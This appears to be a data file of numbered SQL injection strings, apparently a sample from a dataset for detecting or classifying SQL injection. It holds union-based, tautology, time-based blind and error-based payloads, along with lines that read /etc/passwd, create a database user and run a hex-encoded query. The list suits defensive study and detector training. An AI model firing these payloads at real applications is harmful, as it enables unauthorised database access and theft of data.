0 1%'   )    )    union all select null,null# 
1 -8159 where 2793  =  2793 union all select 2793,2793,2793,2793,2793# 
3 1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347-- 
8 1%' union all select null,null,null# 
22 select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg 
23 1   )    )     )   and sleep  (  5  )  # 
40 -7202%"   )    )    union all select 2901# 
43 1"  )   and sleep  (  5  )  # 
61  or 'something'   =   'some'+'thing' 
64 1%" and elt  (  5345  =  8751,8751  )   and "%"  =  " 
72 select 
75 1   )    )     )   rlike sleep  (  5  )  # 
82 1'+  (  select iutk where 6158  =  6158 
83 -4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589# 
86 -9891" union all select 7489# 
89 1  )   where 4992  =  4992 
93 1"   )    )     )   
96  select * from users where id  =  1 or 1#"{ union select null,version  (    )   -- 1 
101 1 where 2060  =  2060 
113 -2071 union all select 4753,4753-- 
119 -5560"   )    )    or 7292  =  6184# 
137  having 1  =  1-- 
143 -5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153# 
157 1%' union all select null,null,null-- 
162 or 1  =  1/* 
168 1" where 7796  =  7796 
171  or userid like '% 
174  )   or   (  'x'  =  'x 
179 1'  )   as rhvm where 1420  =  1420 
182 -- &password  =  
183 select case when 5559  =  3483 then 1 else null end-- 
186 select sleep  (  5  )   and    (    (     (  "lczw"  =  "lczw 
190 1   )    )  
192 -4955%' union all select 5928,5928-- 
199 select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1 
200 1'||  (  select 'etvo' from dual where 1557  =  1557 
205 1234 " AND 1  =  0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055 
211  end and "%"  =  " 
217 select sleep  (  5  )   and    (    (     (  'iwwa' like 'iwwa 
220 *| 
227 select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1 
235 -5327'   )    )     )   or 1606  =  6099 
239 1"   )    )    as xbhp where 7527  =  7527 
243 1' rlike sleep  (  5  )  # 
256 select * from information_schema.tables-- 
267 1   )    )    union all select null,null,null,null-- 
269  select * from users where id  =  1 or "1{" or 1  =  1 -- 1 
273 1"   )    )     )   or sleep  (  5  )  # 
277 1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||' 
281 as 
297 -2453"  )   union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520-- 
300 1'  )   or sleep  (  5  )  
301 1'  )   union all select null# 
305 select * from users where id  =  '1' or $<\ or 1  =  1 -- 1' 
310  end and    (    (     (  "memh" like "memh 
311  select * from users where id  =  1 or ";#" or 1  =  1 -- 1 
321 1  )   where 5629  =  5629 
327 1'  )   where 8707  =  8707 and 3210  =  1477-- 
328 -3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741# 
330 1%"  )   and 9198  =  9198-- 
335  union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1; 
339 1  )   as mixt where 1085  =  1085 or sleep  (  5  )  -- 
346 1%" and 2805  =  1345 
365 -5386'  )   union all select 8026,8026,8026,8026,8026,8026# 
379 select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1' 
384 1  )   as lisg where 5490  =  5490 
385 -6662"   )    )    union all select 6755-- 
402 1  )   where 8671  =  8671 and make_set  (  4931  =  1642,1642  )  -- 
434 select case when 9390  =  5752 then 1 else null end-- 
435 1" and elt  (  4594  =  1040,1040  )   
447 1"  )   as pobe where 1704  =  1704 
458 1%'  )   union all select null# 
466 -2569' union all select 4484-- 
498 select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1 
499 or 'something'   =   'some'+'thing' 
503 -8633" or 5099  =  5974 
514 1'+  (  select hett where 7228  =  7228 
519 1  )   or sleep  (  5  )  # 
536 " " 
540 1 uni/**/on select all from where 
547  select * from users where id  =  1 union select @ 1a,version  (    )   -- 1 
555 create user name identified by 'pass123' 
561  select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1 
568 -6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271# 
569  select * from users where id  =  1 or @#"  (    =  1 or 1  =  1 -- 1 
582 1"   )    )    as hace where 8785  =  8785 
601 -4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415# 
605  (  7098  =  7098 and sleep  (  5   )    )  
608 -7006' where 6966  =  6966 union all select 6966,6966,6966,6966# 
610 1%'  )   union all select null,null-- 
616 1 union all select null,null,null,null,null,null# 
622 or 1  =  1 /* 
624 1"  )   as aifd where 5962  =  5962 
628  or 1  =  1 or ""  =   
631 1 and sleep  (  5  )  
633 1'||  (  select 'boxx' where 2038  =  2038 and 9198  =  9198-- 
635 -8881%' union all select 8420,8420,8420,8420,8420,8420,8420# 
648 1'   )    )    rlike sleep  (  5  )  # 
663 -2630'   )    )    as xavw where 6291  =  6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291# 
674 1"  )   as semi where 4260  =  4260 
691  union   (  select NULL, NULL,   (  select @@version   )    )    -- 
695  select * from users where id  =  1 or "._" or 1  =  1 -- 1 
708 1"  )   where 4112  =  4112 
710 ns 
715  select * from users where id  =  1 or 1#"? or 1  =  1 -- 1 
720  end and    (    (   "dmgj"  =  "dmgj 
731 1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  # 
749 1  )   where 9344  =  9344 
758 \x27UNION SELECT 
762  select * from users where id  =  1 or "  (  _" or 1  =  1 -- 1 
786 1"   )    )    as ynuw where 9138  =  9138 
796  select * from users where id  =  1 or ";[" or 1  =  1 -- 1 
798 -2223'   )    )    as mjwp where 8650  =  8650 or 7900  =  5838 
806 select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- 
810 1' where 1593  =  1593 
823  select * from users where id  =  1 or @#",  =  1 union select 1,version  (    )   -- 1 
826 -1390%"   )    )    union all select 8930,8930,8930,8930,8930# 
829 select case when 2599  =  7035 then 1 else null end-- 
838  select * from users where id  =  1 or @#"{  =  1 or 1  =  1 -- 1 
839 1   )    )     )   or sleep  (  5  )  # 
840  select * from users where id  =  1. union select null,version  (    )   -- 1 
868 -9958"  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741# 
882 1'  )   union all select null-- 
883 1  )   as tbve where 4828  =  4828 
911   (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   
913 or 1 in   (  select @@version  )  -- 
917  select * from users where id  =  1.<1# union select 1,version  (    )   -- 1 
921 1  )   where 7026  =  7026 
925 1   )    )    and sleep  (  5  )   and    (    (   9084  =  9084 
935  or uname like '% 
939 1"   )    )    as sgln where 7573  =  7573 
947 1"  )   as dgzf where 4834  =  4834 
948 1' and 9198  =  9198-- 
955  select * from users where id  =  1 or @#";  =  1 or 1  =  1 -- 1 
959 -8868"  )   where 5681  =  5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681-- 
960 hi' or 1  =  1 -- 
966 a' -- 
971 -5130'   )    )    union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218-- 
977 1 and sleep  (  5  )  # 
984 make_set  (  5679  =  9769,9769  )   
990 1'+  (  select dklj where 3265  =  3265 
993 1'  )   where 5871  =  5871 
1006 1"  )   where 1833  =  1833 
1009 "  )   or benchmark  (  10000000,MD5  (  1   )    )   # 
1035 1'   )    )    as jtmf where 3937  =  3937 
1036 -4811'   )    )     )   union all select 4603,4603,4603,4603,4603,4603,4603,4603,4603-- 
1043 1' rlike sleep  (  5  )  
1049   )   or sleep  (  __TIME__  )    =  ' 
1053  select * from users where id  =  '1' union select \.#,@@VERSION -- 1' 
1056 select case when 8227  =  1229 then 1 else null end-- 
1058 1"  )   where 4951  =  4951 
1060  select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1' 
1064 -4305   )    )     )   union all select 2401,2401-- 
1072 1"  )   where 7548  =  7548 
1080  or '1'   =   '1 
1084 1%'  )   union all select null,null,null,null-- 
1087 declare @q nvarchar   (  200  )   0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  )  
1091 1'+  (  select 'dhcv' where 9372  =  9372 
1094 ^' 
1135 -8933  )   as iiyr where 1974  =  1974 union all select 1974,1974,1974,1974,1974# 
1140  end and    (    (   "%"  =  " 
1142 -3672"   )    )    union all select 6093# 
1144  select * from users where id  =  1 or "?  (  " or 1  =  1 -- 1 
